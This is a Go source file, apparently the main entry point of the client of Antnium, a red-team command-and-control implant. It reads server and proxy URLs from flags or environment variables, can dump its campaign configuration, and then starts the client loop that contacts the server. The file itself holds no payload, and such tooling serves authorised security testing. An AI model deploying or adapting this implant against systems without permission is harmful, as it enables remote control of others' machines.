package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"

	"github.com/dobin/antnium/pkg/client"
	"github.com/dobin/antnium/pkg/wingman"
	log "github.com/sirupsen/logrus"
)

func main() {
	flagServerUrl := flag.String("server", "", "ENV: SERVER") // Upstream
	flagProxyUrl := flag.String("proxy", "", "ENV: PROXY")    // Upstream
	doWingman := flag.Bool("wingman", false, "")              // Functionality
	proto := flag.String("proto", "", "proto")                // Wingman
	data := flag.String("data", "", "data")                   // Wingman

	dumpData := flag.Bool("dumpData", false, "dumpData")
	noProxy := flag.Bool("noProxy", false, "noProxy")

	flag.Parse()

	fmt.Println("Antnium 0.1")
	if *doWingman {
		wingman := wingman.MakeWingman()
		wingman.StartWingman(*proto, *data)
		return
	}

	lvl := "debug"
	ll, err := log.ParseLevel(lvl)
	if err != nil {
		ll = log.DebugLevel
	}
	// set global log level
	log.SetLevel(ll)

	c := client.NewClient()

	if *dumpData {
		json, err := json.Marshal(c.Campaign)
		if err != nil {
			log.Error("Could not JSON marshal")
			return
		}
		fmt.Println(string(json))
		return
	}

	if os.Getenv("SERVER") != "" {
		c.Campaign.ServerUrl = os.Getenv("SERVER")
	}
	if os.Getenv("PROXY") != "" {
		c.Campaign.ProxyUrl = os.Getenv("PROXY")
	}
	// env can be overwritten with args
	if *flagServerUrl != "" {
		c.Campaign.ServerUrl = *flagServerUrl
	}
	if *flagProxyUrl != "" {
		c.Campaign.ProxyUrl = *flagProxyUrl
	}

	if *noProxy {
		c.Campaign.DisableProxy = true
	}

	c.Start()
	c.Loop()

}
